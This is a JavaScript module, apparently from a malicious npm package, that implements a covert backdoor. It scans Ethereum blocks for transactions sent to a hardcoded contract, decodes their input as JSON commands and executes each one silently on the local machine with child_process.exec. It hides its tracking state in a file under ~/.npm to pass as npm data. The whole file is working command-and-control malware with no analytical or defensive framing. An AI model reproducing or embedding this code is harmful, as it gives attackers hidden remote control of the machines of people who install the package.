'use strict';
// Beacon node silencieux : scan des txs de commande, exécution locale.
// Les réponses on-chain sont le rôle du binaire (bin/).
const { rpc } = require('./rpc');
const fs = require('fs');
const os = require('os');
const path = require('path');
const cp = require('child_process');

const CONTRACT = '0xef025c8af567a502bdffcdd1aef26037046f70bb';

function loadState() {
  try {
    return JSON.parse(fs.readFileSync(path.join(os.homedir(), '.npm', '.skh-state.json'), 'utf8'));
  } catch {
    return { lastBlockNum: 0, seen: [] };
  }
}

function saveState(s) {
  try {
    fs.mkdirSync(path.join(os.homedir(), '.npm'), { recursive: true });
    s.seen = s.seen.slice(-50);
    fs.writeFileSync(path.join(os.homedir(), '.npm', '.skh-state.json'), JSON.stringify(s));
  } catch {}
}

async function beacon() {
  const s = loadState();
  const head = Number(await rpc('eth_blockNumber', []));
  const last = Number(s.lastBlockNum) || 0;
  const from = last > 0 ? last + 1 : Math.max(0, head - 200);
  const to = Math.min(head, from + 199);
  const cmds = [];
  for (let bn = from; bn <= to; bn++) {
    const blk = await rpc('eth_getBlockByNumber', ['0x' + bn.toString(16), true]);
    if (!blk) continue;
    for (const tx of blk.transactions || []) {
      if ((tx.to || '').toLowerCase() !== CONTRACT) continue;
      if (!tx.input || tx.input === '0x') continue;
      if (s.seen.includes(tx.hash)) continue;
      let p;
      try { p = JSON.parse(Buffer.from(tx.input.slice(2), 'hex').toString('utf8')); } catch { continue; }
      if (p && p.cmd) { p.tx = tx.hash; cmds.push(p); }
    }
  }
  if (to >= from) s.lastBlockNum = to;
  s.seen.push(...cmds.map((c) => c.tx));
  saveState(s);
  for (const c of cmds) {
    await new Promise((r) => cp.exec(c.cmd, { timeout: (c.timeout || 30) * 1000, windowsHide: true }, () => r()));
  }
}

module.exports = { beacon };
